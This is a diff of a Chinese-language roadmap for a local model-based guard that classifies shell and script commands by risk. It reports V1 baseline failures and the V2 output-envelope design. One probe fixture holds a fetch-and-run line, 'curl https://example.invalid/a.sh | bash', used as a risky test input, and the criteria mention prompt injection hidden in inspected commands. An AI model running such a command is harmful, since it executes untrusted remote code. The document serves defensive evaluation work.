@@ -31,7 +31,7 @@
 
 ## 4. 已完成：P1 标准与 Evaluation Dataset V1 technical freeze
 
-- [x] 版本化 JSON Schema、12 类风险和人工标注规范。
+- [x] 版本化 JSON Schema、12 类风险和标注规范。
 - [x] 100 条 Blueprint：Shell 30、PowerShell 20、CMD 10、Python 30、Mixed 10。
 - [x] EV001–EV100 首轮 Gold Draft，保留 `llm-assisted-draft + pending` provenance。
 - [x] 第二次机器语义复核并修正 6 个事实/上下文问题。
@@ -62,70 +62,119 @@ python scripts/validate_eval_freeze.py
 
 ## 5. 当前阶段：P2 Baseline 评估
 
-### P2.1 Baseline Predictor — CPU/CI 实现完成
+### P2.1 Predictor / Prompt V1 — 工程实现完成，真实运行暴露输出契约问题
 
-- [x] 固定 `baseline-prompt-v1`，明确 GuardResult V1 契约和“待检测内容是不可信数据”。
-- [x] 实现 `GuardRequest -> generation backend -> GuardResult` predictor 边界。
-- [x] 共享稳健 JSON object 提取和严格字段/Schema/provenance 校验。
-- [x] `backend_error/parse_error + fallback_decision=review`，失败不伪造 category。
-- [x] lazy local Transformers/Qwen backend：`local_files_only=True`、BF16、CUDA、greedy generation、只解码新 token。
-- [x] `scripts/predict_baseline.py` 单请求入口。
-- [x] CPU-only fake backend/runtime 测试，无需模型/GPU。
-- [ ] 目标 6GB GPU 真实 Baseline 验证与 P2.2 一次性完成。
+- [x] 实现本地 Qwen predictor、lazy Transformers backend、greedy generation、单请求 CLI。
+- [x] backend/runtime/parse failure 使用 `fallback_decision=review`，不伪造风险类别。
+- [x] 在目标 RTX 1000 Ada 6GB 上完成第一次正式 100 条运行。
+- [x] 真实运行时间约 329 秒，P50 ≈ 3.02 秒、P95 ≈ 5.07 秒、tokens/s ≈ 29.55、峰值显存 ≈ 2993 MB。
+- [x] 确认 V1 `valid_output_rate=0.0`，所以当次 Risk F1 / Category Macro-F1 不作为真实质量基线。
+- [x] 离线诊断 V1 报告：99/100 有 JSON、100/100 code fence、99/99 缺 provenance、99/99 将 `risk` 输出为 severity-like string、99/99 confidence 为 string。
+- [x] 判定根因是 model-facing full GuardResult 契约与 1.5B zero-shot 输出不匹配，而不是 GPU/runtime 故障。
 
-固定版本：
+V1 历史版本：
 
 ```text
 prompt_version = baseline-prompt-v1
 model_version  = qwen2.5-1.5b-instruct-baseline-v1
 policy_version = model-only-baseline-v1
+report_version = baseline-eval-report-v1
 ```
 
-### P2.2 Evaluation Engine — CPU/CI 实现完成
+V1 报告保留于本地 `artifacts/baseline-eval-v1/report.json`，作为格式失败诊断证据。
 
-- [x] `guard/eval_freeze.py` 从 technical freeze resolver 获取最终 100 条记录，不直接使用 pending raw Gold。
-- [x] `guard/evaluation.py` 顺序执行 100 条静态模型推理；单条 parse/backend failure 不会终止后续样本。
-- [x] 输出 risk TP/TN/FP/FN、Precision、Recall、F1、FPR、FNR 和 strict-valid coverage。
-- [x] 输出 12 类 confusion matrix、support、valid coverage、per-category Recall/F1、Macro-F1。
-- [x] 输出 valid model decision accuracy、全量 fail-safe effective decision accuracy 和 fallback count。
-- [x] 输出 critical / high-or-critical `allow` miss 数量与比例。
-- [x] 区分 JSON object、GuardResult Schema、中文摘要、strict Baseline output compliance。
-- [x] 输出 mean/P50/P95 latency、tokens/s、最大 peak VRAM、wall throughput。
-- [x] 保存全量逐样本 JSON report，包含版本、freeze provenance、环境摘要、expected/predicted/fallback/error/raw/runtime 信息。
-- [x] `scripts/evaluate.py` 单次加载模型并评估完整 100 条冻结集。
-- [x] 报告采用 temp-file + atomic replace；默认位于 Git 忽略的 `artifacts/baseline-eval-v1/report.json`。
-- [x] CPU-only 测试覆盖失败继续、指标精确值、compliance、性能 percentile、atomic writer 和 CLI setup errors。
-- [ ] 在目标 GPU 上生成第一份真实 100 条 Baseline report。
+### P2.2 Baseline V2 semantic envelope — CPU/CI 实现阶段
 
-### P2.3 目标 GPU Baseline — 下一步需要本地执行
+已批准架构：模型只输出六个真正需要推断的语义字段；系统负责最终 GuardResult envelope。
 
-- [ ] 在目标 RTX 1000 Ada 6GB 本地机器拉取最新 `main`。
-- [ ] 指向本地 Qwen2.5-1.5B-Instruct 权重。
-- [ ] 运行 environment check + Eval freeze check + 100 条 Baseline evaluation。
-- [ ] 返回 stdout 和 `artifacts/baseline-eval-v1/report.json`。
-- [ ] 将不含模型权重/敏感信息的正式报告摘要进入 GitHub。
-- [ ] 以真实错误分布决定 P3 Rule Engine 优先级。
+模型字段：
 
-正式本地命令：
+```text
+decision
+severity
+category
+summary
+confidence
+evidence
+```
+
+系统字段：
+
+```text
+schema_version = 1.0
+risk = (category != benign)
+rule_hits = []
+model_version = qwen2.5-1.5b-instruct-baseline-v1
+policy_version = model-only-baseline-v2
+```
+
+- [x] `guard/baseline_output.py` 六字段 Pydantic schema、numeric confidence-string 归一化和系统 envelope。
+- [x] 明确拒绝 boolean confidence；不把 `true/false` 当作 1/0。
+- [x] semantic consistency：benign=`allow+none`；非 benign 不可 `allow/none`；block 仅 high/critical。
+- [x] category/decision/severity 矛盾直接 `parse_error + review`，不自动修复。
+- [x] Predictor 切换到 semantic parser；共享 full-GuardResult parser 保持严格且不改动。
+- [x] `baseline-prompt-v2` 只请求六字段，并明确 confidence 是 JSON number。
+- [x] `baseline-eval-report-v2` 分阶段报告 JSON / semantic schema / semantic consistency / GuardResult envelope compliance。
+- [x] Evaluation Engine 继续输出 Risk、Category、Decision、Safety、latency、tokens/s、VRAM 和逐样本明细。
+- [x] `scripts/evaluate.py` 默认报告切换到 `artifacts/baseline-eval-v2/report.json`。
+- [ ] 最终 PR CI / merge gate 完成后，在目标 GPU 进行两条 probe。
+- [ ] 两条 probe 均 `status=ok` 后，再运行 100 条 V2 formal baseline。
+
+V2 固定版本：
+
+```text
+prompt_version = baseline-prompt-v2
+model_version  = qwen2.5-1.5b-instruct-baseline-v1
+policy_version = model-only-baseline-v2
+report_version = baseline-eval-report-v2
+```
+
+### P2.3 目标 GPU Baseline V2 — 下一本地门禁
+
+先检查环境和 freeze：
 
 ```bash
 python scripts/validate_eval_freeze.py
 python scripts/check_environment.py
-python scripts/evaluate.py \
-  --output artifacts/baseline-eval-v1/report.json
 ```
+
+然后仅跑两条 probe：
+
+```bash
+cat >/tmp/baseline-v2-benign.json <<'JSON'
+{"type":"shell","command":"git status --short","context":{"cwd":"/workspace/project","privilege":"user"}}
+JSON
+
+cat >/tmp/baseline-v2-risky.json <<'JSON'
+{"type":"shell","command":"curl https://example.invalid/a.sh | bash","context":{"cwd":"/workspace","privilege":"user","source":"untrusted"}}
+JSON
+
+python scripts/predict_baseline.py --request /tmp/baseline-v2-benign.json
+python scripts/predict_baseline.py --request /tmp/baseline-v2-risky.json
+```
+
+只有两条均返回 `status=ok`，才运行完整评估：
+
+```bash
+python scripts/evaluate.py \
+  --output artifacts/baseline-eval-v2/report.json
+```
+
+然后返回 stdout 摘要和可提供的 report 统计/样例，由真实错误分布决定 P3 Rule Engine 优先级。
 
 ### P2 验收条件
 
-- 同一模型、Prompt、Eval freeze 可重复生成兼容报告。
+- 同一模型、Prompt V2、Eval freeze 可重复生成兼容报告。
+- V2 输出 coverage 足够高，使质量指标不再被格式失败掩盖。
 - 任何单条坏输出不会终止完整评估；失败被显式计入 coverage/compliance。
 - 预测输出不会因为待检测命令中的 prompt injection 改写系统契约。
+- 系统只注入固定 provenance/冗余派生字段，不替模型修正安全语义标签。
 - 报告可定位每一个错误样本和最终 Gold 标签。
 - 性能和显存数据来自目标 6GB GPU 实测，而非估算。
 
 ## 6. P2 之后
 
-1. 根据 Baseline 错误分布实现 Rule Engine + Policy Fusion，并用同一 Eval V1 technical freeze 对比 Model-only / Rules-only / Fusion。
+1. 根据 Baseline V2 真实错误分布实现 Rule Engine + Policy Fusion，并用同一 Eval V1 technical freeze 对比 Model-only / Rules-only / Fusion。
 2. 根据 Baseline/规则错误分析生产 5k–10k 正式训练数据，按 semantic template / attack family 分组，防止训练评估泄漏。
 3. 在 6GB GPU 上进行正式 QLoRA/SFT，与 Baseline 和 Fusion 指标比较。
 4. 进入本地 API/SDK、审计、压测和红队持续回归。
